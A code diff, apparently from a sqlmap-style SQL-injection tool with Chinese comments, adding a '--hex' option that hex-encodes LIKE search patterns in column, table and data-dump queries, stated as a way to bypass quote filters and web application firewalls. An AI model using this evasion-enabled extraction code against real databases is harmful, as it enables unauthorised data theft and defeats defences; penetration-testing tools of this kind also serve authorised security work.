@@ -26,6 +26,8 @@ import {
   resolveFromClause, WRAP, escSql, WRAP_NOCAST,
 } from './DialectSqlBuilder.js';
 import { logger } from '../core/logger.js';
+// [对标 sqlmap --hex] 字符串字面量十六进制化（仅已验证方言，其余显式报错）
+import { buildLikePattern, hexifyLikeInQuery } from './hexLiteral.js';
 // [对标 sqlmap --common-tables/--common-columns] 字典（information_schema 不可用时的枚举出路）
 import { COMMON_TABLES, COMMON_COLUMNS, NONEXISTENT_PROBE } from './commonNames.js';
 // [P0-FIX] 提取路径放大响应上限：防大表拖库被 5MB 默认上限截断
@@ -589,6 +591,19 @@ export class Extractor {
   // 返回 "db.table.column" 字符串数组。支持 opts.start / opts.stop 限制结果范围。
   // MySQL/PG/MSSQL 用 information_schema.columns，Oracle 用 all_tab_columns，
   // SQLite 无 information_schema → 逐表迭代 pragma_table_info。
+  // [对标 sqlmap --hex] 搜索类 SQL 的 LIKE 模式十六进制化（不支持的方言保持原样并告警）
+  _applyHex(ctx, sql, searchTerm, edb) {
+    if (ctx.config?.hex !== true) return sql;
+    try {
+      const out = hexifyLikeInQuery(sql, searchTerm, edb, true);
+      if (out !== sql) logger.info(`--hex 已生效：LIKE 模式转为 ${edb} 十六进制字面量`);
+      return out;
+    } catch (e) {
+      logger.warn(`--hex 未生效（${e.message}）；本次搜索仍用普通 LIKE 模式`);
+      return sql;
+    }
+  }
+
   async searchColumns(ctx, searchTerm, opts = {}) {
     const edb = resolveDbms(ctx.dbms);
     // SQLite：无 information_schema，逐表枚举列名匹配
@@ -611,7 +626,7 @@ export class Extractor {
     const q = SEARCH_COLUMNS_QUERY[edb];
     if (!q) return [];
     const columns = await this._guessColumnsCached(ctx);
-    const val = await this.extractScalar(ctx, q(searchTerm), columns);
+    const val = await this.extractScalar(ctx, this._applyHex(ctx, q(searchTerm), searchTerm, edb), columns);
     if (!val) return [];
     const results = val.split(',').filter(Boolean);
     return this._applySearchLimits(results, opts, ctx);
@@ -625,7 +640,7 @@ export class Extractor {
     const q = SEARCH_TABLES_QUERY[edb];
     if (!q) return [];
     const columns = await this._guessColumnsCached(ctx);
-    const val = await this.extractScalar(ctx, q(searchTerm), columns);
+    const val = await this.extractScalar(ctx, this._applyHex(ctx, q(searchTerm), searchTerm, edb), columns);
     if (!val) return [];
     const results = val.split(',').filter(Boolean);
     return this._applySearchLimits(results, opts, ctx);
@@ -653,8 +668,19 @@ export class Extractor {
       } else {
         continue;
       }
-      // 构造 WHERE 子句：col LIKE '%searchTerm%'（单引号转义）
-      const where = `${col} LIKE '%${escSql(searchTerm)}%'`;
+      // 构造 WHERE 子句：col LIKE '%searchTerm%'
+      //   [对标 sqlmap --hex] 开启时把模式转成十六进制字面量，payload 里不再出现引号与 %，
+      //   用于绕过引号过滤/WAF。不支持的方言会显式抛错（见 hexLiteral.js），不静默降级。
+      const edb = resolveDbms(ctx.dbms);
+      const useHex = ctx.config?.hex === true;
+      let where;
+      try {
+        where = `${col} LIKE ${buildLikePattern(searchTerm, edb, useHex)}`;
+      } catch (e) {
+        // 方言不支持 → 明确告知后回退普通形态（但先把原因打到日志，避免静默失效）
+        logger.warn(`--hex 未生效：${e.message}`);
+        where = `${col} LIKE '%${escSql(searchTerm)}%'`;
+      }
       try {
         const rows = await this.dumpData(ctx, db, table, [col], null, { where, ...opts });
         if (rows && rows.length) {
